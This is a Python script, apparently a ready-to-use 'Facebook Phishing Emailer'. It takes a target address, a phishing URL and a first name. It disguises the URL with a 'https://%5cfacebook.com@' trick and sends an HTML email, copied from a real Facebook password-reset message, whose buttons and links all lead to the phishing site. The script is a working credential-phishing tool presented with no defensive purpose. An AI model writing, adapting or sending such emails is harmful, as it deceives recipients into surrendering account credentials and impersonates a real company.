import yagmail
import argparse

def main():
	parser = argparse.ArgumentParser(description='Facebook Phishing Emailer')
	parser.add_argument('-t', '--target', help='specify target email', type=str, required=True)
	parser.add_argument('-u', '--url', help='specify phishing url', type=str, required=True)
	parser.add_argument('-n', '--name', help='specify first name', type=str, required=True)

	args = parser.parse_args()

	target = args.target
	url = args.url
	firstName = args.name

	url = url.replace('https://', '')
	# using open redirect to mask phishing url
	phish = f'https://%5cfacebook.com@{url}'

	sendEmail(target, firstName, phish)

def sendEmail(target, firstName, phish):
	# 						       Email 						           Alias		   Token
	yag = yagmail.SMTP({'<gmail_account@gmail.com>':'Facebook'}, '<Token>')
	subject = 'Unrecognized Login Attempt'
	# this html variable is a copy & paste of facebook security email
	html = f'''<blockquote type="cite"><div dir="ltr"><table border="0" cellspacing="0" cellpadding="0" align="center" id="m_2158674335951969857email_table" style="border-collapse:collapse"><tbody><tr><td id="m_2158674335951969857email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"><span style="color:#ffffff;font-size:1px;opacity:0">We received a request to reset your Facebook password.</span></td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td height="15" style="line-height:15px" colspan="3">&nbsp;</td></tr><tr><td width="32" align="left" valign="middle" style="height:32;line-height:0px"><img width="32" src="https://ci3.googleusercontent.com/proxy/IQACL2RxMbaGoz3VeUUncVFAVt1C_VDVo-gnKtnxEL0NJYyPS_Sc0Q53XvchPJeEtLeSiF-Ve5ypRACgaU6kfojfihdXBRWFG-4SkwKjMQ=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/I92GqZOkKcu.png" height="32" style="border:0" class="CToWUd" data-bit="iit"></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td width="100%"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:19px;line-height:32px;color:#1877f2"></span></td></tr><tr style="border-bottom:solid 1px #e5e5e5"><td height="15" style="line-height:15px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td height="4" style="line-height:4px">&nbsp;</td></tr><tr><td><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"><span style="font-size:15px"><p></p><div style="margin-top:16px;margin-bottom:20px">Hi {firstName},</div><div>We received a request to reset your Facebook password.</div>Enter the following password reset code:<p></p><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:max-content;margin-top:20px;margin-bottom:20px"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:14px 32px 14px 32px;background-color:#f2f2f2;border-left:1px solid #ccc;border-right:1px solid #ccc;border-top:1px solid #ccc;border-bottom:1px solid #ccc;text-align:center;border-radius:7px;display:block;border:1px solid #1877f2;background:#e7f3ff"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"><span style="font-size:17px;font-family:Roboto;font-weight:700;margin-left:0px;margin-right:0px">506501</span></span></td></tr></tbody></table>Alternatively, you can directly change your password.<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px">&nbsp;</td></tr><tr><td align="middle"><a href="{phish};n=506501&amp;s=23&amp;exp_locale=en_US&amp;cuid=AYhmS8b5S82oOUXgiBitcAhN9ctaW1VVmwjYtI46--viTKFN6YxuYL0-O420TaGYr5uCxgtpJQ5_LXulmHGQYif1-XmqbeTy0_eGwNgPPc9WBQ&amp;redirect_from=button&amp;aref=1677210695187542&amp;medium=email&amp;mid=5f569c21d3984G5af3cd0421b6G5f56a0bb33c56G178&amp;n_m={target}&amp;rms=v2&amp;irms=true" style="color:#1b74e4;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q={phish};source=gmail&amp;ust=1677297896756000&amp;usg=AOvVaw2HV7NMUI2TArBNUFJXnt94"><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:6px;text-align:center;display:block;background:#1877f2;padding:8px 20px 8px 20px"><a href="{phish}" style="color:#1b74e4;text-decoration:none;display:block" target="_blank" data-saferedirecturl="https://www.google.com/url?q={phish};source=gmail&amp;ust=1677297896756000&amp;usg=AOvVaw2HV7NMUI2TArBNUFJXnt94"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#ffffff;font-weight:500;font-family:Roboto-Medium,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:17px">Change&nbsp;password</span></font></center></a></td></tr></tbody></table></a></td></tr><tr><td height="8" style="line-height:8px">&nbsp;</td></tr><tr><td height="20" style="line-height:20px">&nbsp;</td></tr></tbody></table><br><div><span style="color:#333333;font-weight:bold">Didn't request this change?</span></div>If you didn't request a new password, <a href="{phish};id=0&amp;i=iphone_native" style="color:#0a7cff;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q={phish};ust=1677297896756000&amp;usg=AOvVaw0b-7ZrMhOgdBOYZYim8mPY">let us know</a>.</span></span></td></tr><tr><td height="50" style="line-height:50px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table border="0" width="100%" cellspacing="0" cellpadding="0" align="left" style="border-collapse:collapse"><tbody><tr style="border-top:solid 1px #e5e5e5"><td height="19" style="line-height:19px">&nbsp;</td></tr><tr><td style="font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:11px;color:#8a8d91;line-height:16px;font-weight:400"><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;color:#8a8d91;text-align:center;font-size:12px;font-weight:400;font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif"><tbody><tr><td align="center" style="font-size:12px;font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#8a8d91;text-align:center;font-weight:400;padding-bottom:6px">from</td></tr><tr><td align="center" style="font-size:12px;font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#8a8d91;text-align:center;font-weight:400;padding-top:6px;padding-bottom:6px"><img width="74" alt="Meta" height="22" src="https://ci4.googleusercontent.com/proxy/d3D_pwZxEfzej1l0yE5VCB7hNnHBxmwllq0RGTLQMQjNiyMQILxq8jnUO-Q6Wss8zCSYPdVqCSFHrlVWX8fj7LCw=s0-d-e1-ft#https://facebook.com/images/email/meta_logo.png" style="border:0" class="CToWUd" data-bit="iit"></td></tr><tr><td align="center" style="font-size:12px;font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#8a8d91;text-align:center;font-weight:400;padding-top:6px;padding-bottom:6px">© Facebook. Meta Platforms, Inc., Attention: Community Support, 1 Facebook Way, Menlo Park, CA 94025</td></tr><tr><td align="center" style="font-size:12px;font-family:Roboto-Regular,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#8a8d91;text-align:center;font-weight:400;padding-top:6px">This message was sent to <a style="color:#1b74e4;text-decoration:none" href="mailto:{target}" target="_blank">{target}</a>. <br>To help keep your account secure, please don't forward this email. <a style="color:#1b74e4;text-decoration:none" href="{phish}" target="_blank" data-saferedirecturl="https://www.google.com/url?q={phish};source=gmail&amp;ust=1677297896756000&amp;usg=AOvVaw32a_gTLGaF02ZsdRO9v6WQ">Learn more</a></td></tr></tbody></table></td></tr><tr><td height="10" style="line-height:10px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci4.googleusercontent.com/proxy/d47dq6GkACEyqd214JW6qfTJfS0f7J4HXHf_7QTJUlcV4vrn2RXK5ldTjMoPzUTiJt7Q_3RJgaVooxQdtZKlMhzkmdhNLSQl92lbwWCOLy0AgXBmnGbzvPP1MneEma6IHfVztctP91Q3DgK5Daa6hDTnfQ=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5f569c21d3984G5af3cd0421b6G5f56a0bb33c56G178" style="border:0;width:1px;height:1px" class="CToWUd" data-bit="iit"></span></td></tr></tbody></table><div class="yj6qo"></div><div class="adL"></div></div></blockquote>'''
	yag.send(target, subject, html)
	print(f"[*] Email sent to {target}")

main()
